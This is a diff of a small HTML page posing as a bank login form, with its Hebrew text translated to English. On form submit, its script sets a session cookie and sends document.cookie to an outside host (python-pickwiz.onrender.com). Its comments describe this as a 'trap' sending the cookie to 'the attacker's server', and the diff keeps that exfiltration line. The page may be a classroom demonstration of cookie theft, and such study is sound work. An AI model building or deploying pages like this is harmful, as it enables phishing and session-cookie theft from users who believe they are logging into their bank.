@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="he" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>מערכת בנקאית מאובטחת</title>
+    <title>Secure Banking System</title>
     <style>
         body { font-family: sans-serif; background-color: #eef2f3; text-align: center; padding-top: 80px; }
         .bank-card { background: white; padding: 40px; display: inline-block; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 400px; }
@@ -14,24 +14,25 @@
 <body>
 
     <div class="bank-card">
-        <h1>התחברות לחשבון הבנק</h1>
+        <h1>Bank Login</h1>
         <form id="loginForm">
-            <input type="text" placeholder="שם משתמש" required><br>
-            <input type="password" placeholder="סיסמה" required><br>
-            <button type="submit">התחבר</button>
+            <input type="text" placeholder="Username" required><br>
+            <input type="password" placeholder="Password" required><br>
+            <button type="submit">Login</button>
         </form>
     </div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
-            // 1. יצירת עוגיית סשן פיקטיבית כאילו המשתמש התחבר בהצלחה
+            
+            // 1. Create a fake session cookie as if the user logged in successfully
             document.cookie = "session_token=secret_user_12345; path=/";
             
-            // 2. הפעלת ה"מלכודת" - שליחת העוגיה לשרת התוקף
-            fetch('https://python-pickwiz.onrender.com/log?cookie=' + document.cookie);
+            // 2. Trigger the "trap" - send the cookie to the attacker's server
+            fetch('https://python-pickwiz.onrender.com/log?cookie=' + encodeURIComponent(document.cookie));
             
-            alert("התחברת בהצלחה!");
+            alert("Logged in successfully!");
         });
     </script>
 
